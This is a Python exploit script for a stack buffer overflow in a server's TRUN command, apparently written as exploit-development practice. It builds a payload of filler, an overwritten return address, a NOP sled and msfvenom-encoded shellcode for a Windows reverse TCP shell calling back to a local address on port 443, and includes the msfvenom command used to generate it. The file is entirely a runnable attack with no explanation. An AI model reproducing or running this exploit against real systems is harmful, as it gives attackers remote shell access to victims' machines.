#!/usr/bin/env python3

import sys, socket

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

filler = 'TRUN' + ' .' + 'A'*2006
ret = '\xAF\x11\x50\x62'
#payload = '\xCC'*(2500-2006-4)
nops = '\x90'*10

#msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.116.129 LPORT=443 -b '\x00' -f py -v shellcode
'''
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1900 bytes
'''
# Total size = 2006 + 4 + 10 + 351 = 2371 < 2500
shellcode =  ""
shellcode += "\xda\xcb\xbd\xab\x5e\xc4\xbd\xd9\x74\x24\xf4\x58"
shellcode += "\x29\xc9\xb1\x52\x31\x68\x17\x03\x68\x17\x83\x6b"
shellcode += "\x5a\x26\x48\x97\x8b\x24\xb3\x67\x4c\x49\x3d\x82"
shellcode += "\x7d\x49\x59\xc7\x2e\x79\x29\x85\xc2\xf2\x7f\x3d"
shellcode += "\x50\x76\xa8\x32\xd1\x3d\x8e\x7d\xe2\x6e\xf2\x1c"
shellcode += "\x60\x6d\x27\xfe\x59\xbe\x3a\xff\x9e\xa3\xb7\xad"
shellcode += "\x77\xaf\x6a\x41\xf3\xe5\xb6\xea\x4f\xeb\xbe\x0f"
shellcode += "\x07\x0a\xee\x9e\x13\x55\x30\x21\xf7\xed\x79\x39"
shellcode += "\x14\xcb\x30\xb2\xee\xa7\xc2\x12\x3f\x47\x68\x5b"
shellcode += "\x8f\xba\x70\x9c\x28\x25\x07\xd4\x4a\xd8\x10\x23"
shellcode += "\x30\x06\x94\xb7\x92\xcd\x0e\x13\x22\x01\xc8\xd0"
shellcode += "\x28\xee\x9e\xbe\x2c\xf1\x73\xb5\x49\x7a\x72\x19"
shellcode += "\xd8\x38\x51\xbd\x80\x9b\xf8\xe4\x6c\x4d\x04\xf6"
shellcode += "\xce\x32\xa0\x7d\xe2\x27\xd9\xdc\x6b\x8b\xd0\xde"
shellcode += "\x6b\x83\x63\xad\x59\x0c\xd8\x39\xd2\xc5\xc6\xbe"
shellcode += "\x15\xfc\xbf\x50\xe8\xff\xbf\x79\x2f\xab\xef\x11"
shellcode += "\x86\xd4\x7b\xe1\x27\x01\x2b\xb1\x87\xfa\x8c\x61"
shellcode += "\x68\xab\x64\x6b\x67\x94\x95\x94\xad\xbd\x3c\x6f"
shellcode += "\x26\x02\x68\x1b\x37\xea\x6b\xe3\x36\x50\xe2\x05"
shellcode += "\x52\xb6\xa3\x9e\xcb\x2f\xee\x54\x6d\xaf\x24\x11"
shellcode += "\xad\x3b\xcb\xe6\x60\xcc\xa6\xf4\x15\x3c\xfd\xa6"
shellcode += "\xb0\x43\x2b\xce\x5f\xd1\xb0\x0e\x29\xca\x6e\x59"
shellcode += "\x7e\x3c\x67\x0f\x92\x67\xd1\x2d\x6f\xf1\x1a\xf5"
shellcode += "\xb4\xc2\xa5\xf4\x39\x7e\x82\xe6\x87\x7f\x8e\x52"
shellcode += "\x58\xd6\x58\x0c\x1e\x80\x2a\xe6\xc8\x7f\xe5\x6e"
shellcode += "\x8c\xb3\x36\xe8\x91\x99\xc0\x14\x23\x74\x95\x2b"
shellcode += "\x8c\x10\x11\x54\xf0\x80\xde\x8f\xb0\xb1\x94\x8d"
shellcode += "\x91\x59\x71\x44\xa0\x07\x82\xb3\xe7\x31\x01\x31"
shellcode += "\x98\xc5\x19\x30\x9d\x82\x9d\xa9\xef\x9b\x4b\xcd"
shellcode += "\x5c\x9b\x59"

total = filler + ret + nops + shellcode + '\r\n'

try:
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	client.connect((host, port)) # Connect to user supplied port and IP address
	print(client.recv(1024))	
	print("Sending buffer..")
	client.send(total.encode('latin-1'))
	print(client.recv(1024))

except:
	print("Cannot connect!")
	sys.exit(0)

client.close()
